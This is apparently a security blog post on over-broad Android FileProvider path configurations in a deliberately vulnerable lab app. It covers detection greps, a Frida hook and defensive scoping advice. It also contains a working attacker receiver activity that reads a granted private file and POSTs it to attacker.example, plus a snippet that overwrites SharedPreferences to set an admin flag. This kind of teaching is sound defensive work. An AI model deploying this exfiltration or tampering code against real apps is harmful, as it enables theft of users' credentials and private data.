`FileProvider` is how Android apps safely share files with each other without exposing private storage directly. You configure it with an XML file that says which directories are shareable, and the framework generates `content://` URIs that point only inside those directories. Sounds airtight. The problem is that most developers configure it wrong - and the misconfiguration is a single attribute in that XML file.

    <li>the FileProvider declaration in <code>AndroidManifest.xml</code></li>
  </ul>
</aside>

<br>**What does the vulnerable configuration look like?**

The provider declaration in `AndroidManifest.xml` points to an XML file that defines the scope:

```xml
<provider
    android:name="androidx.core.content.FileProvider"
    android:authorities="com.vulnlab.app.fileprovider"
    android:exported="false"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/file_paths" />
</provider>
```

The `android:resource` attribute tells you which XML file defines what the FileProvider can actually serve. Open `res/xml/file_paths.xml` and you find:

```xml
<paths>
    <!-- VULN: root-path with path="/" - entire filesystem accessible -->
    <root-path name="root" path="/" />

    <!-- Also over-broad: exposes entire files dir -->
    <files-path name="files" path="." />

    <!-- Also over-broad: exposes entire external storage -->
    <external-path name="external" path="." />
</paths>
```

What does `<root-path name="root" path="/" />` do? It tells the FileProvider that URIs under `content://com.vulnlab.app.fileprovider/root/` can resolve to *any* absolute path starting from `/`. That is the entire filesystem - private databases, shared preferences, key files, everything the app's UID can read. The scope is the device, not a directory.

Now look at the activity that calls `FileProvider.getUriForFile()`. What does the code below do?

```java
findViewById(R.id.btn_share).setOnClickListener(v -> {
    String path = etPath.getText().toString();
    File file = new File(path);
    // VULN: FileProvider's root-path is "/" so ANY file resolves to a valid URI
    Uri contentUri = FileProvider.getUriForFile(this, AUTHORITY, file);

    Intent shareIntent = new Intent(Intent.ACTION_SEND);
    shareIntent.setType("*/*");
    shareIntent.putExtra(Intent.EXTRA_STREAM, contentUri);
    shareIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
    startActivity(Intent.createChooser(shareIntent, "Share via"));
});
```

It takes a path from the UI, passes it straight to `getUriForFile()`, wraps the resulting URI in a share Intent with `FLAG_GRANT_READ_URI_PERMISSION`, and fires the share chooser. The user picks an app from the chooser, and that app receives a valid, granted `content://` URI pointing at whatever path was entered - including `/data/data/com.vulnlab.app/databases/vulnlab.db`.

<br>**How do you identify it?**

Start in `AndroidManifest.xml`. The `<provider>` entry gives you two things: the authority (what `content://` host to target) and the pointer to the paths XML via `android:resource`.

```bash
find . -name '*file_paths*.xml' -o -name '*provider*paths*.xml' | xargs cat
```

Read each `<paths>` declaration. Look for:

- `<root-path>` with any path - the entire filesystem is in scope.
- `<files-path path=".">` - the entire `files/` directory, not just a subdirectory.
- `<external-path path=".">` - all of external storage.
- Any path without a trailing `/` - `path="exports"` matches `exports_secret/` too.

But finding an over-broad paths XML alone is not enough to report. Is the FileProvider directly queryable by a third-party app? No - `android:exported="false"` blocks that. So what is the actual attack surface?

The attack surface is any **exported component** in the same app that takes attacker-controlled input, passes it to `FileProvider.getUriForFile()`, and sends the resulting URI out with `FLAG_GRANT_READ_URI_PERMISSION`. The over-broad paths XML is what makes `getUriForFile()` silently accept any path instead of throwing `IllegalArgumentException`. Without it, the activity's share flow would still exist but would be harmless - any path outside the intended scope would crash the method.

So grep for exported components calling `getUriForFile()`:

```bash
grep -rn 'getUriForFile\|FLAG_GRANT_READ_URI_PERMISSION' decompile/
```

For each hit, check whether the component is exported and whether the path it passes to `getUriForFile()` comes from external input - an Intent extra, a deep-link parameter, a UI field, anything the attacker can supply. A hardcoded path is not exploitable here; an attacker-supplied one is.

<br>**Confirming it with Frida**

Hook `FileProvider.getUriForFile` and watch which absolute paths the app mints into grantable URIs. What should you expect? With `<root-path path="/">`, any path resolves cleanly. A correctly-scoped provider throws `IllegalArgumentException` for paths outside its configured directories - that exception is the confirmation that it is *not* vulnerable.

Hook `Intent.putExtra` and filter for `EXTRA_STREAM` - this fires the moment the granted URI enters the share Intent, regardless of which internal FileProvider method built it:

```javascript
Java.perform(function () {
  const Intent = Java.use('android.content.Intent');
  const Uri    = Java.use('android.net.Uri');
  Intent.putExtra.overload('java.lang.String', 'android.os.Parcelable')
    .implementation = function (key, value) {
      if (key === 'android.intent.extra.STREAM') {
        console.log('[FileProvider] URI granted -> ' + Java.cast(value, Uri).toString());
      }
      return this.putExtra(key, value);
    };
});
```

Launch the share flow and enter a path outside the intended exports directory:

```bash
uv run frida -U -f com.vulnlab.app -l file-provider-overbroad.js
adb shell am start -n com.vulnlab.app/.activities.FileProviderActivity
```

```
[FileProvider] URI granted -> content://com.vulnlab.app.fileprovider/root/data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml
```

The `/root/` segment maps directly to the `<root-path name="root" path="/">` entry - proof the FileProvider accepted an arbitrary absolute path as a grantable URI.

<br>**The attacker app**

`FileProviderActivity` is exported and fires `ACTION_SEND` with `FLAG_GRANT_READ_URI_PERMISSION` on whatever path the user types. The path goes directly to `new File(path)` - no base directory prepended - so any absolute path on the filesystem is valid. The attacker launches the activity, enters an absolute path to a private file, taps share, and picks the attacker app from the chooser.

For the attacker app to appear in the chooser it needs an `ACTION_SEND` intent-filter in its manifest:

```xml
<activity android:name=".ShareReceiverActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.SEND" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:mimeType="*/*" />
    </intent-filter>
</activity>
```

The attacker activity receives the Intent with the granted URI, opens an `InputStream` on it - the FileProvider serves the file using the victim app's UID - reads it into a byte array, and POSTs it out:

```java
public class ShareReceiverActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri uri = getIntent().getParcelableExtra(Intent.EXTRA_STREAM);
        if (uri == null) return;

        try {
            InputStream is = getContentResolver().openInputStream(uri);
            if (is == null) return;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[64 * 1024];
            int n;
            while ((n = is.read(buf)) > 0) baos.write(buf, 0, n);
            is.close();

            new Thread(() -> {                           // exfiltrate off the main thread
                try {
                    new OkHttpClient().newCall(new Request.Builder()
                        .url("https://attacker.example/")
                        .post(RequestBody.create(
                            baos.toByteArray(),
                            MediaType.parse("application/octet-stream")))
                        .build()).execute();
                } catch (IOException ignored) {}
            }).start();
        } catch (IOException ignored) {}
    }
}
```

The path `/data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml` entered in the UI becomes a valid grantable URI only because `<root-path path="/">` is in the paths XML. A correctly-scoped provider would throw `IllegalArgumentException` before the share Intent is ever built.

<br>**What if the grant carries write permission?**

Some activities add `FLAG_GRANT_WRITE_URI_PERMISSION` alongside read - either because the feature needs it or out of carelessness. Write access through a `root-path` FileProvider escalates significantly. What can the attacker overwrite?

**SharedPreferences.** The app's XML preference files live at `shared_prefs/<name>.xml`. Writing a crafted XML file flips boolean flags, replaces session tokens, or injects values the app reads on next launch:

```java
ParcelFileDescriptor fd = getContentResolver().openFileDescriptor(uri, "w");
BufferedWriter w = new BufferedWriter(new FileWriter(fd.getFileDescriptor()));
w.write("<?xml version='1.0'?><map><boolean name=\"is_admin\" value=\"true\"/></map>");
w.flush();
fd.close();
```

**Native libraries.** If the app loads `.so` files from `files/` or `cache/`, writing a malicious library to that path and triggering a reload gives the attacker code execution inside the target process. The FileProvider opens the path with the target app's UID - the attacker's write lands in a location the app trusts and executes. This is the highest-impact end of the chain: arbitrary file read becomes remote code execution with no additional primitives.

<br>**What if the developer thinks they scoped it correctly?**

A developer who read the documentation writes:

```xml
<files-path name="exports" path="exports/" />
```

That correctly scopes the FileProvider to `getFilesDir() + "/exports/"`. Any path outside `exports/` throws. Good.

But many developers write:

```xml
<files-path name="exports" path="." />
```

The `.` means "current dir == `getFilesDir()`". The scope is the entire `files/` directory, not the intended subdirectory. Everything the app ever wrote to `files/` is now grantable.

Subtler still:

```xml
<files-path name="exports" path="exports" />
```

Without the trailing slash, FileProvider matches any path whose string starts with `exports` - including `exports_secret/`. One missing character, completely different scope.

<br>**The `<external-path>` variant**

External storage (`/sdcard/`) is readable by all apps anyway on older Android. So an over-broad `<external-path>` seems low-impact - until Android Q. Scoped storage on Q+ means apps can no longer read each other's media directories directly. But a FileProvider with `<external-path path=".">` lets an attacker read the target's camera roll, downloads dir, and app-specific external cache (`/sdcard/Android/data/<pkg>/files/`) even though scoped storage would normally block them.

<br>**Chaining with the provider-grant primitive**

The over-broad paths XML chains directly with the provider-grant-escalation primitive covered in an [earlier post](blogs/2026-05-25-DONE-provider-grant-escalation.md). There, the primitive is obtaining a persistable URI permission. Here, the over-broad `root-path` defines how wide that permission reaches. Combined: the attacker fires the exported `ShareActivity` once, receives the grant, calls `takePersistableUriPermission`, and from then on can construct and read any `content://com.vulnlab.app.fileprovider/root/…` URI indefinitely - no further user interaction needed.

<br>**Defence**

Specific subdirectories with trailing slashes only:

```xml
<paths>
    <files-path name="exports" path="exports/" />
    <cache-path name="thumbs"  path="thumbnails/" />
</paths>
```

And in code, the path passed to `getUriForFile()` should be derived from internal logic, not from caller-supplied input.

<br>**Closing**

The FileProvider is safe when scoped, dangerous when broad. The audit is one XML file and one grep. Open every `file_paths.xml` in every app you test, read the `path` attribute on each element, and check whether any exported component feeds external input into `getUriForFile()`. The bug is often a single character - a missing trailing slash, a `.` instead of a subdirectory name, a `<root-path>` left in from development.

Happy Hacking !!
